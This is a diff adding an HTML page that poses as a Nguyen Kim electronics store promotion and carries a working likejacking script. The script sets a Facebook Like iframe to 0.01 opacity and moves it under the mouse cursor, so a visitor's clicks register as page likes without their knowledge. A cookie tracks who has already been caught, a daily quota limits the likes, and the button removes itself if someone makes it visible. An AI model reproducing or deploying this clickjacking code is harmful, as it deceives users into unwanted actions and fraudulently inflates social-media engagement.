@@ -1,0 +1,147 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<!-- saved from url=(0076)http://event.nguyenkim.com/fb32/Domain/fbl/8038576115c34ad33e37be0d292fdd44/ -->
+<html xmlns="http://www.w3.org/1999/xhtml" xmlns:og="http://ogp.me/ns#" xmlns:fb="http://www.facebook.com/2008/fbml"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><script async="" src=""></script>
+        
+		<title>Khuyến mãi nguyễn kim</title>
+		<meta property="og:type" content="product">
+		<meta property="og:title" content="Khuyến mãi nguyễn kim - 8038576115c34ad33e37be0d292fdd44">
+		<meta property="og:image" content="http://www.nguyenkim.com/images/companies/1/logo_nk.png">
+		<meta property="og:url" content="http://www.nguyenkim.com">
+		<meta property="og:description" content="khuyến mãi tại Nguyễn Kim">
+		<meta property="og:site_name" content="Siêu thị điện máy Nguyễn Kim - www.nguyenkim.com">
+		<meta property="fb:app_id" content="915378028490475">
+                    <script type="text/javascript" src=""></script>
+            <script type="text/javascript" src=""></script>
+            <script type="text/javascript" src=""></script>
+            <script type="text/javascript" src=""></script>
+         
+       
+    </head>
+
+    <body>
+	<script>
+	
+ function fetchLikeCount(url){
+    return $.Deferred(function(defer){
+        $.ajax({
+            dataType: 'jsonp',
+            url: 'https://api.facebook.com/method/fql.query?callback=callback',
+            data: {
+                query: 'SELECT like_count FROM link_stat WHERE url="' + url + '"',
+                format: 'JSON'
+            }
+        }).then(function(res){
+            try{
+                var count = res[0].like_count;
+                defer.resolve(count);
+            }catch(e){
+                reject();
+            }
+        }, reject);
+        function reject(){
+            defer.reject(';(');
+        };
+    }).promise();
+}   
+
+var cookieValue= true;   
+var fbAppId = '915378028490475';
+var startLikeCount = 144452;
+var limitPerDay = 999;
+var fbFP ="https://www.facebook.com/Online.NguyenKim";
+var currentLike =0;
+fetchLikeCount(fbFP).always(function(res){
+ currentLike =res;
+ var date1 = new Date();    
+ var date2 = new Date('2016/01/25 00:00:00');
+ var diff = (date1 - date2)/1000;
+ var diff = Math.abs(Math.floor(diff)); 
+ var days = Math.floor(diff/(24*60*60));
+ var remainLike = ((days * limitPerDay) + startLikeCount )- currentLike;
+ //var rand = Math.floor((Math.random() * 10) + 1); 
+
+ window.fbAsyncInit = function() {
+    FB.init({
+      appId      : '915378028490475',
+      channelUrl: '/ads/app/webroot/js/facebook/channel.html',
+      xfbml      : true,
+      version    : 'v2.3',
+      status:true, 
+      cookie:true,
+      frictionlessRequests:true
+	  
+    });
+
+	 var hateBtn = $("#fbLike");
+	  //alert("Số lượng like bắt đầu tính giới hạn: "+startLikeCount +"\nSố lượng like hiện tại:" + currentLike+"\nSố lượng giới hạn mỗi ngày: "+limitPerDay+"\nSố lượng like còn lại:"+remainLike);
+	 if(hateBtn.length > 0 && remainLike >0)
+	 {
+		
+		FB.getLoginStatus(function(response) {
+		  if (response.status === 'connected' || response.status === 'not_authorized') {
+		 	var cookie = $.cookie("nklike");
+			if(!cookie || cookie.indexOf(cookieValue).toString() < 0)
+             {			
+			   $(document).mousemove(function(event ) {
+                        hateBtn.css({
+                            left: event .pageX - 15 + "px",
+                            top: event .pageY - 3 + "px"
+                        });
+				if( $(document.activeElement).attr("id") == "fbIframe" )
+				{
+				$.cookie("nklike", cookieValue, {
+                            expires: 30,
+                            path: "/"
+                });
+				hateBtn.remove();
+				
+				}
+				});
+			 }
+			 else
+			 {
+			 
+			 hateBtn.remove();
+			 
+			 }
+		 }
+		 else
+		 {
+		  hateBtn.remove();
+		 }
+	 })
+	 }
+	 else if(remainLike<=0)
+	 {
+	 hateBtn.remove();
+	 }
+	
+	};
+	  (function(d, s, id){
+     var js, fjs = d.getElementsByTagName(s)[0];
+     if (d.getElementById(id)) {return;}
+     js = d.createElement(s); js.id = id;
+     js.src = "//connect.facebook.net/vi_VN/sdk.js";
+     fjs.parentNode.insertBefore(js, fjs);
+   }(document, 'script', 'facebook-jssdk'));
+});
+$(function () {			
+$("#fbLike").attrchange({
+	trackValues: true, 
+	callback: function(evnt) {
+		if(evnt.attributeName == "style") { 
+			if(evnt.newValue.indexOf("opacity: 1").toString() >=0) {
+				 console.log(evnt.newValue);
+			   $('#fbLike').remove();
+			}
+		}
+	}
+});
+});
+</script>
+<div id="fb-root"></div>
+<div id="fbLike" style="height: 20px; width: 28px; overflow: hidden; position: absolute; opacity: 0.01 !important; z-index: 9999">
+<iframe id="fbIframe" src="like.html" scrolling="no" frameborder="0" style="border:none; overflow:hidden; width:450px; height:21px;left:-18px; position:relative" allowtransparency="true"></iframe>
+</div>
+
+</body></html>
